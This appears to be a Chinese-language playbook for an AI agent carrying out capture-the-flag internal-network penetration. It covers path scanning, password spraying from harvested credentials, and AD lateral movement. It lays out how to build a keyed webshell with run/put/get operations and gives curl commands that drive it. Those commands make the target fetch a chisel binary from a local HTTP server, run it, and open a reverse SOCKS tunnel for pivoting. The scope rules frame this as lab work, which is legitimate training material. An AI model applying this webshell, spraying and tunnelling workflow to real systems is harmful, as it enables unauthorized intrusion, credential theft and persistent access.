# 内网渗透工作区

**目标：拿入口、打内网、`heimdall-submit`。** 先读 `input.json`。`instance_rotated` 时先探新 `container_addr`。

| 面 | 工具 |
|---|---|
| 路径扫描 | `dirsearch` + `paths.txt`，初始探测时使用轻量扫描信息收集|
| webshell | 自写 HTTP 简易webshell，用 `curl` 交互 |
| 代理 | **优先** reverse chisel（`127.0.0.1:1080`）；回连不通再在靶上起 chisel server |
| SSH/SQL | `sshpass` `mysql` `psql` `sqlite3` |
| AD | `nxc` `certipy` Impacket（`/opt/heimdall/ad`）；同一目标串行 |
| 其它 | `nmap` `curl` `nuclei` `john` `heimdall-ocr`；`chisel` |

## 字典

观察者读日志，并引导从已控面（web 后台 / 库 / 面板 / 配置 / history）dump **登录名和口令规则**，写入 `.heimdall/traffic/loot.json`。已收集的登录名和规则自由扩成：

- `.heimdall/traffic/spray_users.txt`
- `.heimdall/traffic/spray_passwords.txt`
- `.heimdall/traffic/spray_creds.txt`（`user:pass`）

登录口先喷轻量通用字典 `/opt/heimdall/tools/wordlists/passwords.txt`（对表单用户名 / `admin`），没中再用观察者动态产出的字典 `.heimdall/traffic/spray_creds.txt` 针对性；本里已有、该面还没试的族就喷，不要 rockyou。读到空表只说明观察者这一拍还没 publish，不要否定字典；CONFIRMED / 图上出现 `DICT` 或 `rev` 变了就再读。HTTP / SSH / FTP 登录喷并发 4；deny 后 0.3–0.5s；超时或 No route 停 10s,可以根据情报构造针对喷洒，但是不能自己瞎猜构造超大字典打蹦服务


## 序

**RCE 了先自写简易稳定 webshell，用它执行命令和上传，再用 chisel 打隧道，再后渗透。**

外网 `container_addr` → 轻量路径扫 → 第一面 flag 立刻交 → RCE / 库 / 面板先只读收情报（用户名、哈希、配置、history、密钥、产品名、人名 → loot / `spray_*.txt`）→ 自写壳（命令执行和上传都走 curl）→ **优先 reverse chisel**（探测到回连地址）→ 不通再 **靶上 chisel server + 本机 client** → `proxychains4`。AD 域用工具包横向。

## 端口

| | |
|---|---|
| chisel SOCKS | `1080`（本机 `127.0.0.1:1080`） |
| chisel 投放 | `$CHISEL_DROP`（`/opt/heimdall/proxy/chisel-drop/`） |

## 自写 webshell

按目标语言自己写一个小 HTTP 助手，落到可 web 访问的路径，密钥记在 `progress.md`。命令执行和文件上传**默认走这个助手**。用 `curl --data-urlencode`，先 `whoami` 再干别的。不要覆盖正在用的壳。

自己实现（无密钥返回 404）：
- `op=run`：执行 `c`，回 stdout+stderr 原文
- `op=put`：把 `b64` 解码写到 `path`
- `op=get`：读 `path`，回原文
- 长任务：`run` 里 `nohup ... >/tmp/job.log 2>&1 & echo $!`，再 `run`/`get` 轮询到结束

```bash
# 源码先写到 artifacts/，再用当前 RCE 落到靶上，记下 SHELL_URL / SHELL_KEY
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=whoami"
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=put" --data-urlencode "path=/tmp/x" --data-urlencode "b64=$(base64 -w0 ./local_x)"
```

## 代理
不出网，但目标和本机局域网相通，可在本机建立服务端

```bash
# 优先 reverse chisel（靶上 200 才填 REACHABLE_IP）
python3 -m http.server 8000 --bind 0.0.0.0 --directory "$CHISEL_DROP"
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=curl -fsSL http://$REACHABLE_IP:8000/chisel_linux_amd64 -o /tmp/chisel && chmod +x /tmp/chisel"
"$CHISEL_DROP/chisel_linux_amd64" server --reverse --socks5 --host 0.0.0.0 --port 8080
curl -sS -X POST "$SHELL_URL" --data-urlencode "k=$SHELL_KEY" --data-urlencode "op=run" --data-urlencode "c=nohup /tmp/chisel client http://$REACHABLE_IP:8080 R:socks >/tmp/chisel.log 2>&1 & echo $!"
# 备用（回连全 timeout）：助手在靶上起 chisel server --socks5 --host 0.0.0.0 --port 1080，本机 chisel client http://TARGET:1080 socks；端口不通就继续用助手在靶上执行内网命令
```

## 硬规则

- 范围 = `container_addr` / 题目网段。
- 先只读枚举；改域 / dump 凭据前确认是拿 flag 所需。
- 有 `flag{...}` 立刻 submit。换实例后旧 IP 作废（`dead_hosts`）。
